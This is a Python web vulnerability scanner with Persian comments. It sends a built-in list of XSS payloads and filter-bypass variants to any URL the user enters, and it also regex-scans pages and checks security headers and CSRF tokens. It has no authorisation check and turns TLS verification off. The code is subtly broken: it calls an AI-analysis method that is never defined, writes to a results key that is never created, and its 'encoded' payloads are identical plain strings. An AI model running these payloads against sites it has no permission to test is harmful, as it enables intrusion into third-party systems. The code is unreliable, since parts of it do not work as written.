#!/usr/bin/env python3

# ایمپورت کتابخانه های مورد نیاز
import requests
from bs4 import BeautifulSoup
import re
import sys
import json
import time
import urllib.parse
from typing import List, Dict, Any, Set
from concurrent.futures import ThreadPoolExecutor
import colorama
from colorama import Fore, Style
import html
import warnings
import socket
from urllib3.exceptions import InsecureRequestWarning
from collections import defaultdict

# غیرفعال کردن هشدارهای درخواست ناامن
warnings.filterwarnings('ignore', category=InsecureRequestWarning)


class VulnerabilityScanner:
    def __init__(self):
        self.mistral_api_key = None  # کلید API برای Mistral AI
        self.base_url = None  # URL هدف
        self.headers = None  # هدرهای درخواست
        self.session = requests.Session()  # ایجاد یک session برای درخواست ها
        self.visited_urls = set()  # URL های بازدید شده
        self.found_vulnerabilities = defaultdict(list) # آسیب پذیری های پیدا شده

        # الگوهای XSS توسعه یافته
        self.xss_patterns = {
            'basic_xss': [
                r'<script\b[^>]*>.*?</script>',
                r'javascript:[^"]*',
                r'on\w+\s*=\s*(["\']).*?\1',
                r'data:text/html.*?base64',
                r'<iframe.*?srcdoc\s*=\s*(["\']).*?\1',  # srcdoc در iframe
                r'<object.*?data\s*=\s*(["\']).*?\1.*?</object>',  # تگ object با data
                r'<embed.*?src\s*=\s*(["\']).*?\1',  # تگ embed با src
            ],
            'attribute_injection': [
                r'<\w+\s+[^>]*?=["\'][^"\']*?<script',  # تلاش برای شکستن ویژگی و تزریق اسکریپت
                r'<\w+\s+[^>]*?=["\'][^"\']*?on\w+\s*=',  # تلاش برای تزریق event handler در ویژگی
                r'style\s*=\s*(["\']).*?expression\(.*?\1',  # استفاده از expression در style (مختص IE)
                r'background-image\s*:\s*url\s*\(\s*[\'"]?javascript:',  # تزریق جاوااسکریپت در background-image
                r'background\s*:\s*url\s*\(\s*[\'"]?javascript:',  # تزریق جاوااسکریپت در background
            ],
            'dom_manipulation': [
                r'document\.write\(.*?\)',
                r'document\.location\s*=\s*[\'"].*?[\'"]',
                r'window\.location\.href\s*=\s*[\'"].*?[\'"]',
                r'localStorage\.setItem\(.*?\)',
                r'sessionStorage\.setItem\(.*?\)',
                r'eval\(.*?\)',
                r'setTimeout\s*\(\s*[\'"].*?[\'"]',
                r'setInterval\s*\(\s*[\'"].*?[\'"]',
                r'\$\(.*?\)\[\d+\]\.innerHTML\s*=',  # دستکاری innerHTML با jQuery
                r'\$\(.*?\)\[\d+\]\.html\(',  # دستکاری html با jQuery
            ],
            'protocol_handlers': [
                r'vbscript:',
                r'data:.*?/javascript',  # شناسایی data URI برای جاوااسکریپت
                r'mocha:',
                r'livescript:',
            ],
            'encoded_payloads': [
                r'%3Cscript.*?%3E.*?%3C/script%3E',  # URL encoded <script>
                r'&#[xX]?[\da-fA-F]+;',  # HTML entity encoded
                r'\\u[\da-fA-F]{4}',  # Unicode encoded
                r'&#\d+;',  # Decimal HTML entity
                r'\\x[0-9a-fA-F]{2}',  # Hex encoded
                r'&#[0-9]+;',  # Decimal encoded
            ],
            'bypass_techniques': [
                r'<s\s*/\s*script[^>]*>',  # شکستن تگ <script> با فضای خالی (اصلاح شده)
                r'<img\s+src\s*=\s*"?\'?x\'?"?\s+onerror\s*=\s*"?[^\'"]*?"?',  # onerror بدون مقدار مشخص
                r'<body\s+onload\s*=\s*"?[^\'"]*?"?',  # تگ body با onload
                r'<input\s+type\s*=\s*"image"\s+onerror\s*=\s*"?[^\'"]*?"?',  # تگ input type image با onerror
                r'<!--.*?<script.*?-->',  # اسکریپت مخفی شده در کامنت HTML
                r'<!\[CDATA\[.*?<script.*?]]>',  # اسکریپت مخفی شده در CDATA
                r'<!--.*?--><script',  # شکستن کامنت و شروع اسکریپت
            ],
            'html5_specific': [
                r'<video.*?onloadstart\s*=',
                r'<audio.*?onloadstart\s*=',
                r'<details.*?ontoggle\s*=',
                r'<svg.*?onload\s*=',
                r'<math.*?onclick\s*=',
            ],
            'server_side_includes': [
                r'<!--#include\s+virtual=".*?-->',  # SSI include virtual
                r'<!--#include\s+file=".*?-->',  # SSI include file
                r'<%.*?%>',  # ASP style server-side includes
                r'<\?php.*?\?>',  # PHP tags
            ],
            'open_redirect': [
                r'window\.location\.replace\s*\(\s*[\'"]?([^"\']*)[\'"]?\s*\)',
                r'window\.open\s*\(\s*[\'"]?([^"\']*)[\'"]?\s*\)',
                r'response\.sendRedirect\s*\(\s*[\'"]?([^"\']*)[\'"]?\s*\)',  # Java redirect
                r'header\s*\(\s*[\'"]?Location:\s*([^"\']*)[\'"]?\s*\)',  # PHP header redirect
                r'<meta\s+http-equiv="refresh"\s+content="[^;]*;\s*url=([^"]*)"',  # Meta refresh
            ]
        }

        # بررسی های سیاست امنیت محتوا (CSP)
        self.csp_checks = [
            'default-src',
            'script-src',
            'style-src',
            'img-src',
            'connect-src',
            'font-src',
            'frame-src',
            'report-uri'
        ]

        # هدرهای امنیتی
        self.security_headers = [
            'X-Frame-Options',
            'X-Content-Type-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'Referrer-Policy'
        ]

    def check_dns_vulnerability(self) -> Dict:
        """بررسی آسیب پذیری های مربوط به DNS"""
        try:
            hostname = urllib.parse.urlparse(self.base_url).hostname  # دریافت hostname از URL
            ip_addresses = socket.gethostbyname_ex(hostname)  # دریافت آدرس های IP مربوط به hostname
            return {
                'hostname': hostname,  # نام میزبان
                'ip_addresses': ip_addresses[2],  # آدرس های IP
                'aliases': ip_addresses[1]  # نام های مستعار
            }
        except socket.gaierror as e:  # مدیریت خطا در صورت عدم دسترسی به DNS
            return {'error': str(e)}




    def check_security_headers(self, response: requests.Response) -> Dict:
        """تجزیه و تحلیل هدرهای امنیتی"""
        headers_analysis = {}  # دیکشنری برای ذخیره نتایج تحلیل هدرها
        for header in self.security_headers:  # بررسی هر هدر امنیتی
            if header in response.headers:  # بررسی وجود هدر
                headers_analysis[header] = {
                    'present': True,  # هدر وجود دارد
                    'value': response.headers[header]  # مقدار هدر
                }
            else:  # هدر وجود ندارد
                headers_analysis[header] = {
                    'present': False,  # هدر وجود ندارد
                    'recommendation': f"Add {header} header for enhanced security"  # توصیه برای اضافه کردن هدر
                }
        return headers_analysis  # # بازگرداندن نتایج تحلیل

    def analyze_form_security(self, form: BeautifulSoup) -> Dict:
        """تجزیه و تحلیل ویژگی های امنیتی فرم"""
        csrf_token = False  # وجود توکن CSRF
        autocomplete = form.get('autocomplete', 'on')  # مقدار ویژگی autocomplete
        method = form.get('method', 'get').lower()  # متد فرم
        action = form.get('action', '')  # آدرس action فرم

        # بررسی وجود توکن CSRF
        for input_tag in form.find_all('input'):  # بررسی تمام فیلدهای input
            if any(token in input_tag.get('name', '').lower() for token in
                    ['csrf', 'token', '_token']):  # بررسی نام فیلد برای یافتن توکن CSRF
                csrf_token = True  # توکن CSRF پیدا شد
                break

        return {  # بازگرداندن نتایج تحلیل
            'has_csrf_token': csrf_token,  # آیا توکن CSRF دارد؟
            'method': method,  # متد فرم
            'action': action,  # آدرس action فرم
            'autocomplete': autocomplete,  # مقدار autocomplete
            'risk_level': 'High' if not csrf_token and method == 'post' else 'Medium' if method == 'get' else 'Low'
            # سطح ریسک
        }

    def find_injection_points(self, html_content: str) -> List[Dict]:
        """یافتن نقاط تزریق احتمالی در HTML"""
        injection_points = []  # لیستی برای ذخیره نقاط تزریق
        soup = BeautifulSoup(html_content, 'html.parser')  # ایجاد parser HTML

        # بررسی فیلدهای ورودی
        for input_tag in soup.find_all(['input', 'textarea']):  # یافتن تمام فیلدهای input و textarea
            input_type = input_tag.get('type', 'text')  # نوع فیلد ورودی
            if input_type not in ['hidden', 'submit', 'button']:  # بررسی نوع فیلد
                injection_points.append({
                    'type': 'input',  # نوع نقطه تزریق
                    'element': str(input_tag),  # المان HTML
                    'risk': 'High' if input_type in ['text', 'search', 'url'] else 'Medium'  # سطح ریسک
                })

        # بررسی پارامترهای URL
        parsed_url = urllib.parse.urlparse(self.base_url)  # تجزیه URL
        if parsed_url.query:  # بررسی وجود پارامتر در URL
            params = urllib.parse.parse_qs(parsed_url.query)  # استخراج پارامترها
            for param in params:  # بررسی هر پارامتر
                injection_points.append({
                    'type': 'url_parameter',  # نوع نقطه تزریق
                    'parameter': param,  # نام پارامتر
                    'risk': 'High'  # سطح ریسک
                })

        return injection_points  # بازگرداندن لیست نقاط تزریق




    def test_xss_payload(self, url: str, param: str, payload: str) -> Dict:
        """تست یک پیلود XSS در برابر یک پارامتر"""
        try:
            # ایجاد URL تست
            parsed = urllib.parse.urlparse(url)  # تجزیه URL
            params = urllib.parse.parse_qs(parsed.query)  # استخراج پارامترها
            params[param] = [payload]  # تنظیم مقدار پارامتر با پیلود
            new_query = urllib.parse.urlencode(params, doseq=True)  # کدگذاری پارامترها
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))  # ایجاد URL جدید

            # ارسال درخواست
            response = self.session.get(test_url, verify=False, timeout=5)  # ارسال درخواست GET

            return {  # بازگرداندن نتایج تست
                'url': test_url,  # URL تست
                'payload': payload,  # پیلود استفاده شده
                'reflected': payload in response.text,  # آیا پیلود در پاسخ منعکس شده است؟
                'encoded_reflected': html.escape(payload) in response.text,
                # آیا پیلود کدگذاری شده در پاسخ منعکس شده است؟
                'status_code': response.status_code  # کد وضعیت HTTP
            }
        except requests.RequestException as e:  # مدیریت خطا در صورت بروز مشکل در درخواست
            return {
                'url': test_url,  # URL تست
                'payload': payload,  # پیلود استفاده شده
                'error': str(e)  # پیام خطا
            }




    def generate_xss_payloads(self) -> List[str]:
        """تولید پیلودهای XSS مختلف برای تست"""
        return [  # لیستی از پیلودهای XSS
                "<script>alert('XSS')</script>",
        "<SCRIPT>alert('XSS')</SCRIPT>", # حروف بزرگ
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>", # تگ شکسته
        "<img src=x onerror=alert('XSS')>",
        "<img src=x οnerrοr=alert('XSS')>", # استفاده از کاراکترهای مشابه
        "<svg/onload=alert('XSS')>",
        "<svg/οnlοad=alert('XSS')>", # استفاده از کاراکترهای مشابه
        "<details/open/ontoggle=alert('XSS')>", # HTML5
        "<iframe src=javascript:alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        "<a href=\"javascript:alert('XSS')\">Click Me</a>",
        "`<script>alert('XSS')</script>`", # بک‌تیک
        '"><script>alert("XSS")</script>', # بستن تگ و تزریق
        "';alert('XSS');//", # بستن رشته و تزریق
        '</script><script>alert("XSS")</script>', # بستن و باز کردن تگ
        "<w=\"\" /><script>alert('XSS')</script>", # شکستن تگ با ویژگی خالی
        "<w='' /><script>alert('XSS')</script>", # شکستن تگ با ویژگی خالی
        "<textarea><script>alert('XSS')</script></textarea>", # اسکریپت در textarea
        "<title><script>alert('XSS')</script></title>", # اسکریپت در title
        "<style></style><script>alert('XSS')</script>", # اسکریپت بعد از style
        "<div style=\"width:expression(alert('XSS'));\"></div>", # expression در style (IE)
        "<div style=\"background-image: url(javascript:alert('XSS'))\"></div>", # جاوااسکریپت در background-image
        "<input type=\"image\" src=\"\" onerror=\"alert('XSS')\">", # input type image با onerror
        "<body onload=alert('XSS')>", # body با onload
        "<input onfocus=alert('XSS') autofocus>", # onfocus با autofocus
        "<select onchange=alert('XSS')><option>Test</option></select>", # onchange در select
        "<marquee onstart=alert('XSS')>", # marquee با onstart
        "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>", # srcdoc با HTML entities
        "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>", # srcdoc
        "<math><maction xlink:href=\"javascript:alert('XSS')\"></maction></math>",
        "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert('XSS')</script></body></foreignObject></svg>", # SVG خارجی
        "<svg onload=\"javascript:alert('XSS')\">", # SVG onload
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">", # meta refresh
        "<!--<script>alert('XSS')</script>-->", # اسکریپت در کامنت
        "<![CDATA[<script>alert('XSS')</script>]]>", # اسکریپت در CDATA
        "'\"",  # تلاش برای شکستن context
        "\\",  # تلاش برای escape
        "%253Cscript%253Ealert('XSS')%253C/script%253E", # Double URL encoded
        "<script>alert('XSS')</script>", # HTML entities
        "<script>alert('XSS')</script>", # Hex encoded
        "<script>alert('XSS')</script>", # Decimal encoded
        "jav\tascript:alert('XSS')", # استفاده از Tab
        "java\nscript:alert('XSS')", # استفاده از Newline
        "javascript\x3aalert('XSS')", # استفاده از Hex encoding در پروتکل
        "javascript:alert('XSS')", # استفاده از HTML entity در پروتکل
        "<<SCRIPT>alert(\"XSS\")//<</SCRIPT>", # تگ با حروف بزرگ و کاراکترهای اضافه
        ]

    def scan_target(self) -> Dict[str, Any]:
        """تابع اصلی اسکن"""
        results = {  # دیکشنری برای ذخیره نتایج اسکن
                'url': self.base_url,  # URL هدف
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),  # زمان اسکن
                'vulnerabilities': defaultdict(list),  # آسیب پذیری های پیدا شده
                'security_analysis': {}  # تحلیل های امنیتی
        }

        try:
                print(f"{Fore.YELLOW}[*] Starting comprehensive scan of {self.base_url}{Style.RESET_ALL}")

                # درخواست اولیه
                response = self.session.get(self.base_url, verify=False)  # ارسال درخواست GET به URL هدف
                html_content = response.text  # دریافت محتوای HTML

                # تحلیل هدرهای امنیتی
                print(f"{Fore.CYAN}[*] Analyzing security headers...{Style.RESET_ALL}")
                results['security_headers'] = self.check_security_headers(response)  # تحلیل هدرهای امنیتی

                # بررسی آسیب پذیری DNS
                print(f"{Fore.CYAN}[*] Checking DNS configuration...{Style.RESET_ALL}")
                results['dns_info'] = self.check_dns_vulnerability()  # بررسی پیکربندی DNS

                # یافتن نقاط تزریق
                print(f"{Fore.CYAN}[*] Identifying injection points...{Style.RESET_ALL}")
                injection_points = self.find_injection_points(html_content)  # یافتن نقاط تزریق
                results['injection_points'] = injection_points  # ذخیره نقاط تزریق

                # تحلیل فرم ها
                print(f"{Fore.CYAN}[*] Analyzing form security...{Style.RESET_ALL}")
                soup = BeautifulSoup(html_content, 'html.parser')  # ایجاد parser HTML
                forms = soup.find_all('form')  # یافتن تمام فرم ها
                results['forms_analysis'] = [self.analyze_form_security(form) for form in forms]  # تحلیل امنیت فرم ها

                # تست آسیب پذیری های XSS
                print(f"{Fore.CYAN}[*] Testing XSS vulnerabilities...{Style.RESET_ALL}")
                xss_payloads = self.generate_xss_payloads()  # تولید پیلودهای XSS

                for point in injection_points:  # بررسی هر نقطه تزریق
                    if point['type'] == 'url_parameter':  # اگر نقطه تزریق از نوع پارامتر URL باشد
                        print(f"{Fore.YELLOW}[*] Testing parameter: {point['parameter']}{Style.RESET_ALL}")
                        for payload in xss_payloads:  # تست هر پیلود XSS
                            result = self.test_xss_payload(self.base_url, point['parameter'], payload)  # تست پیلود
                            if result.get('reflected') or result.get(
                                    'encoded_reflected'):  # اگر پیلود در پاسخ منعکس شده باشد
                                results['vulnerabilities']['xss'].append(result)  # ذخیره نتیجه

                # تحلیل مبتنی بر الگو
                for category, patterns in self.xss_patterns.items():  # بررسی هر دسته از الگوهای XSS
                    print(f"{Fore.CYAN}[*] Checking {category} patterns...{Style.RESET_ALL}")
                    for pattern in patterns:  # بررسی هر الگو
                        matches = re.finditer(pattern, html_content, re.IGNORECASE)  # جستجوی الگو در محتوای HTML
                        for match in matches:  # بررسی هر تطابق
                            results['vulnerabilities'][category].append({  # ذخیره نتیجه تطابق
                                'pattern': pattern,  # الگوی تطابق یافته
                                'matched_content': match.group(0),  # محتوای تطابق یافته
                                'position': match.span()  # موقعیت تطابق در رشته
                            })

                # اگر کلید API Mistral موجود باشد، تحلیل با هوش مصنوعی انجام می شود
                if self.mistral_api_key:  # بررسی وجود کلید API
                    print(f"{Fore.CYAN}[*] Performing AI-powered analysis...{Style.RESET_ALL}")
                    for vuln_type, vulns in results['vulnerabilities'].items():  # بررسی هر نوع آسیب پذیری
                        if vulns:  # فقط در صورت وجود آسیب پذیری، تحلیل انجام می شود
                            analysis = self.analyze_with_mistral(json.dumps(vulns))  # تحلیل با Mistral AI
                            if analysis:  # اگر تحلیل با موفقیت انجام شد
                                results['ai_analysis'][vuln_type] = analysis  # ذخیره نتیجه تحلیل

                return results  # بازگرداندن نتایج اسکن

        except Exception as e:  # مدیریت خطا در صورت بروز مشکل در اسکن
                print(f"{Fore.RED}[!] Error during scan: {e}{Style.RESET_ALL}")
                results['error'] = str(e)  # ذخیره پیام خطا
                return results  # بازگرداندن نتایج




def main():
    colorama.init()  # مقداردهی اولیه colorama
    scanner = VulnerabilityScanner()  # ایجاد یک شی از کلاس VulnerabilityScanner

    # نمایش پیام خوش آمدگویی
    print(f"""{Fore.CYAN}
    ╔═══════════════════════════════════════╗
    ║     Enhanced Vulnerability Scanner    ║
    ║      With Mistral AI Integration      ║
    ║               Made by:                ║
    ║      shirdalcode.ir | shayan taki     ║
    ╚═══════════════════════════════════════╝
    {Style.RESET_ALL}""")

    # دریافت URL از کاربر
    while True:
        url = input(f"{Fore.GREEN}[+] Enter target URL: {Style.RESET_ALL}").strip()  # دریافت URL از کاربر
        if url.startswith(('http://', 'https://')): # بررسی معتبر بودن URL
            scanner.base_url = url # تنظیم URL هدف
            break
        print(f"{Fore.RED}[!] Please enter a valid URL starting with http:// or https://{Style.RESET_ALL}") # نمایش پیام خطا

    # دریافت کلید API Mistral از کاربر (اختیاری)
    api_key = input(
        f"{Fore.GREEN}[+] Enter Mistral API key (press Enter to skip AI analysis): {Style.RESET_ALL}").strip() # دریافت کلید API
    if api_key: # بررسی وجود کلید API
        scanner.mistral_api_key = api_key # تنظیم کلید API

    # شروع اسکن
    print(f"\n{Fore.YELLOW}[*] Starting comprehensive vulnerability scan...{Style.RESET_ALL}")
    results = scanner.scan_target() # شروع اسکن

    # ذخیره نتایج
    timestamp = time.strftime('%Y%m%d-%H%M%S') # ایجاد timestamp
    filename = f'vulnerability_scan_{timestamp}.json' # نام فایل برای ذخیره نتایج
    with open(filename, 'w') as f: # ذخیره نتایج در فایل
        json.dump(results, f, indent=2)  # ذخیره نتایج در قالب JSON

    # نمایش خلاصه نتایج
    print(f"\n{Fore.GREEN}[+] Scan complete! Summary:{Style.RESET_ALL}") # نمایش پیام پایان اسکن
    print(f"\nVulnerabilities found:") # نمایش آسیب پذیری های پیدا شده
    for vuln_type, vulns in results['vulnerabilities'].items(): # بررسی هر نوع آسیب پذیری
        print(f"{Fore.YELLOW}- {vuln_type}: {len(vulns)} potential issues{Style.RESET_ALL}") # نمایش تعداد آسیب پذیری ها

        if len(vulns) > 0: # نمایش جزئیات آسیب پذیری ها (حداکثر 3 مورد)
            print(f"\n{Fore.CYAN}Details for {vuln_type}:{Style.RESET_ALL}")
            for i, vuln in enumerate(vulns[:3], 1):
                if isinstance(vuln, dict):
                    if 'pattern' in vuln:
                        print(f"  {i}. Pattern matched: {vuln['pattern']}")
                        print(f"     Content: {vuln['matched_content'][:100]}...")
                    elif 'payload' in vuln:
                        print(f"  {i}. Payload: {vuln['payload']}")
                        print(f"     URL: {vuln['url']}")
                        print(f"     Reflected: {'Yes' if vuln.get('reflected') else 'No'}")
            if len(vulns) > 3:
                print(f"\n     ... and {len(vulns) - 3} more issues") # نمایش پیام در صورت وجود موارد بیشتر

    # نمایش خلاصه تحلیل هدرهای امنیتی
    if 'security_headers' in results: # بررسی وجود تحلیل هدرهای امنیتی
        print(f"\n{Fore.CYAN}Security Headers Analysis:{Style.RESET_ALL}")
        headers = results['security_headers'] # دریافت نتایج تحلیل هدرها
        missing_headers = [header for header, info in headers.items() if not info['present']] # یافتن هدرهای مفقود
        if missing_headers:  # نمایش هدرهای مفقود
            print(f"{Fore.RED}Missing security headers:{Style.RESET_ALL}")
            for header in missing_headers:  # نمایش هر هدر مفقود
                print(f"- {header}")
        else:  # تمام هدرهای امنیتی موجود هستند
            print(f"{Fore.GREEN}All essential security headers are present{Style.RESET_ALL}")

    # نمایش خلاصه تحلیل امنیت فرم ها
    if 'forms_analysis' in results: # بررسی وجود تحلیل فرم ها
        print(f"\n{Fore.CYAN}Form Security Analysis:{Style.RESET_ALL}")
        high_risk_forms = [form for form in results['forms_analysis'] if form['risk_level'] == 'High']  # یافتن فرم های با ریسک بالا
        if high_risk_forms:  # نمایش فرم های با ریسک بالا
            print(f"{Fore.RED}Found {len(high_risk_forms)} high-risk forms:{Style.RESET_ALL}")
            for form in high_risk_forms: # نمایش هر فرم با ریسک بالا
                print(f"- Form action: {form['action']}") # نمایش action فرم
                print(f"  Missing CSRF token: {'Yes' if not form['has_csrf_token'] else 'No'}") # نمایش وضعیت توکن CSRF

    # نمایش خلاصه نقاط تزریق
    if 'injection_points' in results: # بررسی وجود نقاط تزریق
        print(f"\n{Fore.CYAN}Injection Points Analysis:{Style.RESET_ALL}")
        high_risk_points = [point for point in results['injection_points'] if point['risk'] == 'High'] # یافتن نقاط تزریق با ریسک بالا
        if high_risk_points: # نمایش نقاط تزریق با ریسک بالا (حداکثر 3 مورد)
            print(f"{Fore.RED}Found {len(high_risk_points)} high-risk injection points:{Style.RESET_ALL}")
            for point in high_risk_points[:3]:
                if point['type'] == 'input': # نمایش اطلاعات نقطه تزریق
                    print(f"- Input element: {point['element'][:100]}...") # نمایش المان input
                else:
                    print(f"- URL parameter: {point['parameter']}") # نمایش پارامتر URL


    # نمایش خلاصه تحلیل هوش مصنوعی (در صورت وجود)
    if 'ai_analysis' in results and results['ai_analysis']:  # بررسی وجود تحلیل هوش مصنوعی
        print(f"\n{Fore.CYAN}AI Analysis Summary:{Style.RESET_ALL}")
        for vuln_type, analysis in results['ai_analysis'].items():  # نمایش نتایج تحلیل برای هر نوع آسیب پذیری
            if 'choices' in analysis and analysis['choices']:  # بررسی وجود نتایج تحلیل
                print(f"\n{Fore.YELLOW}Analysis for {vuln_type}:{Style.RESET_ALL}")
                print(analysis['choices'][0]['message']['content'][:500] + "...") # نمایش بخشی از نتایج تحلیل


    print(f"\n{Fore.GREEN}[+] Full report saved to: {filename}{Style.RESET_ALL}") # نمایش مسیر فایل گزارش
    print(
        f"{Fore.YELLOW}[*] Note: Some findings may be false positives. Manual verification is recommended.{Style.RESET_ALL}") # نمایش پیام توجه


if __name__ == "__main__":
    try:
        main()  # اجرای تابع main
    except KeyboardInterrupt:  # مدیریت وقفه توسط کاربر
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:  # مدیریت خطاهای دیگر
        print(f"\n{Fore.RED}[!] An error occurred: {e}{Style.RESET_ALL}")
        sys.exit(1)